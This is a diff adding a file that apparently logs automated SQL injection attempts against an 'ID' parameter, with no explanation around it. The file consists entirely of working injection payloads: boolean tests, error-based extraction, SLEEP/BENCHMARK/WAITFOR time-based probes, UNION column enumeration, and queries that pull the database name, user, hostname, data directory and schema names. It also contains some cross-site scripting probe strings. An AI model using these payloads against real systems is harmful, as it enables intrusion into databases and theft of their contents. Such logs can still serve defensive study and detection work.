@@ -1,0 +1,163 @@
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:9718
+ID:1,,"(',.,(.
+ID:1'BdNbJj<'">BSOScK
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:6583
+ID:1"(.,((.,')
+ID:1'XeiXwS<'">dnBdHI
+ID:1
+ID:1
+ID:3272
+ID:1',.)),,")(
+ID:1'ViCeKx<'">nVwwRk
+ID:1
+ID:1
+ID:7316
+ID:1).)'.().".
+ID:1'KJKWaK<'">przQfn
+ID:1) AND 5394=9226 AND (6648=6648
+ID:1) AND 2832=2832 AND (5390=5390
+ID:1 AND 7883=8862
+ID:1 AND 2832=2832
+ID:1 AND 8861=8673-- OPdA
+ID:1 AND 2832=2832-- Lwxn
+ID:1') AND 3169=8271 AND ('ReRz'='ReRz
+ID:1') AND 2832=2832 AND ('VYWJ'='VYWJ
+ID:1' AND 4787=7420 AND 'dXhm'='dXhm
+ID:1' AND 2832=2832 AND 'mkYJ'='mkYJ
+ID:1' AND 8669=4066 AND 'rGEe'='rGEe
+ID:1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170787671,(SELECT (ELT(9914=9914,1))),0x7178787171,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'zhwi'='zhwi
+ID:1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170787671,(SELECT (ELT(5821=5821,1))),0x7178787171,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'BVem'='BVem
+ID:1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170787671,(SELECT (ELT(2567=2567,1))),0x7178787171,0x78))x)) AND 'LqSW'='LqSW
+ID:1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7170787671,(SELECT (ELT(7934=7934,1))),0x7178787171,0x78))x)) AND 'bHTE'='bHTE
+ID:1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7170787671,(SELECT (ELT(1631=1631,1))),0x7178787171)) USING utf8))) AND 'gsgE'='gsgE
+ID:1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7170787671,(SELECT (ELT(7252=7252,1))),0x7178787171)) USING utf8))) AND 'DmiV'='DmiV
+ID:1' AND (SELECT 6101 FROM(SELECT COUNT(*),CONCAT(0x7170787671,(SELECT (ELT(6101=6101,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CXwb'='CXwb
+ID:(SELECT CONCAT(0x7170787671,(SELECT (ELT(9077=9077,1))),0x7178787171))
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:9081
+ID:1(.")((,.)'
+ID:1'KyMaRw<'">PqhHOT
+ID:1) AND 5224=4307 AND (2192=2192
+ID:1) AND 8474=8474 AND (5733=5733
+ID:1 AND 5106=1340
+ID:1 AND 8474=8474
+ID:1 AND 2213=7232-- hJTO
+ID:1 AND 8474=8474-- IUsE
+ID:1') AND 2194=7902 AND ('jnTx'='jnTx
+ID:1') AND 8474=8474 AND ('qUBN'='qUBN
+ID:1' AND 5083=7705 AND 'ierI'='ierI
+ID:1' AND 8474=8474 AND 'cOzS'='cOzS
+ID:1' AND 9788=2203 AND 'kPdr'='kPdr
+ID:1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767071,(SELECT (ELT(9132=9132,1))),0x716b7a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'SbdV'='SbdV
+ID:1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a767071,(SELECT (ELT(9716=9716,1))),0x716b7a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'NuFj'='NuFj
+ID:1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a767071,(SELECT (ELT(4542=4542,1))),0x716b7a6271,0x78))x)) AND 'BQsc'='BQsc
+ID:1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a767071,(SELECT (ELT(2189=2189,1))),0x716b7a6271,0x78))x)) AND 'AaUC'='AaUC
+ID:1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a767071,(SELECT (ELT(9555=9555,1))),0x716b7a6271)) USING utf8))) AND 'QxEh'='QxEh
+ID:1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a767071,(SELECT (ELT(5954=5954,1))),0x716b7a6271)) USING utf8))) AND 'wkWR'='wkWR
+ID:1' AND (SELECT 4004 FROM(SELECT COUNT(*),CONCAT(0x716a767071,(SELECT (ELT(4004=4004,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vlGt'='vlGt
+ID:(SELECT CONCAT(0x716a767071,(SELECT (ELT(4304=4304,1))),0x716b7a6271))
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1';SELECT SLEEP(5)#
+ID:1';SELECT SLEEP(5) AND 'sxBb'='sxBb
+ID:1';(SELECT * FROM (SELECT(SLEEP(5)))kAHZ)#
+ID:1';(SELECT * FROM (SELECT(SLEEP(5)))PUNu) AND 'ZHjt'='ZHjt
+ID:1';SELECT BENCHMARK(5000000,MD5(0x55696a75))#
+ID:1';SELECT BENCHMARK(5000000,MD5(0x63724747)) AND 'GcRl'='GcRl
+ID:1' AND (SELECT 7199 FROM (SELECT(SLEEP(5)))cBVr) AND 'QECt'='QECt
+ID:1' AND (SELECT 7199 FROM (SELECT(SLEEP(0)))cBVr) AND 'QECt'='QECt
+ID:1' AND (SELECT 7199 FROM (SELECT(SLEEP(5)))cBVr) AND 'QECt'='QECt
+ID:1' ORDER BY 1-- ktBm
+ID:1' ORDER BY 5446-- dBST
+ID:1' ORDER BY 10-- kxxD
+ID:1' ORDER BY 6-- Fkpz
+ID:1' ORDER BY 4-- xAaO
+ID:1' ORDER BY 3-- uczh
+ID:1' UNION ALL SELECT CONCAT(0x716a767071,0x52535a6b4b7947416c6551514a7a644e644465716e7758434f584c7a544c414a716a446c6b63564f,0x716b7a6271),NULL,NULL-- yUQW
+ID:1' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767071,0x506942474979754c42477367547a5577766d6e4b685548794750426d517067467677737745785654,0x716b7a6271)-- rWSW
+ID:1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x78577a49774443565342576d696675445574755a4c454c44416853624f56597744724c4d66526a58,0x716b7a6271),NULL-- yRLU
+ID:1' UNION ALL SELECT CONCAT(0x716a767071,0x78586d6a676374787947,0x716b7a6271),NULL,NULL-- lZpD
+ID:1' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767071,0x674f6f7477586d537671,0x716b7a6271)-- OxCp
+ID:1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x577270525a6d4749584f,0x716b7a6271),NULL-- QDGU
+ID:-3627' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767071,0x484c68486d4f516a6f424e6d6a4e48426d4c456d47634b5652616c4b517a7277504d425446505962,0x716b7a6271)-- pQEC
+ID:-1849' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767071,(CASE WHEN (4520=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4520) THEN 1 ELSE 0 END),0x716b7a6271)-- IsWE
+ID:1
+ID:1
+ID:1
+ID:1'test
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1 if(1=1) waitfor delay '0:0:4'--
+ID:1' if(1=1) waitfor delay '0:0:4'--
+ID:1;if(1=1) waitfor delay '0:0:4'--
+ID:1';if(1=1) waitfor delay '0:0:4'--
+ID:1');if(1=1) waitfor delay '0:0:4'--
+ID:1);if(1=1) waitfor delay '0:0:4'--
+ID:1 and (select 1 from (select(sleep(4-(if((1=1), 0, 4)))))test)#
+ID:1) and (select 1 from (select(sleep(4-(if((1=1), 0, 4)))))test)#
+ID:1' and (select 1 from (select(sleep(4-(if((1=1), 0, 4)))))test)#
+ID:1' and (select 1 from (select(sleep(4-(if((1=1), 0, 4)))))test)#
+ID:1 and 1=2
+ID:1' or (1=2) and 'a'='a
+ID:1 and 1=2#
+ID:1' and 1=2#
+ID:1' and 1=1#
+ID:1' and (select 1 from information_schema.CHARACTER_SETS limit 1)>0#
+ID:1 or (select 1 from (select count(*),concat(0x696E6A65637474657374,floor(rand(0)*2))x from information_schema.tables group by x)a)#
+ID:1 and (select 1 from (select count(*),concat(0x696E6A65637474657374,floor(rand(0)*2))x from information_schema.tables group by x)a)#
+ID:1) or (select 1 from (select count(*),concat(0x696E6A65637474657374,floor(rand(0)*2))x from information_schema.tables group by x)a) and (1=1
+ID:1) and (select 1 from (select count(*),concat(0x696E6A65637474657374,floor(rand(0)*2))x from information_schema.tables group by x)a) and (1=1
+ID:1' or (select 1 from (select count(*),concat(0x696E6A65637474657374,floor(rand(0)*2))x from information_schema.tables group by x)a)#
+ID:1' or 1=1 order by 1-- -#
+ID:1' or 1=1 order by 1000-- -#
+ID:1' or 1=1 order by 25-- -#
+ID:1' or 1=1 order by 12-- -#
+ID:1' or 1=1 order by 6-- -#
+ID:1' or 1=1 order by 3-- -#
+ID:1' or 1=1 order by 4-- -#
+ID:1' and 1=2 union all select 12863+1,12863+2,12863+3#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(database(),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(user(),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(database(),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(user(),0x20)),0x215e5e),1#
+,1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(@@hostname,0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(user(),0x20)),0x215e5e),1#
+,1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(database(),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(@@datadir,0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull(@@basedir,0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select count(1) from information_schema.schemata),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 0,1),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 1,1),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 2,1),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 3,1),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 4,1),0x20)),0x215e5e),1#
+ID:1' and 1=2 union all select 1,concat(0x5e5e21,concat_ws(0x245f24,ifnull((select schema_name from information_schema.schemata limit 5,1),0x20)),0x215e5e),1#
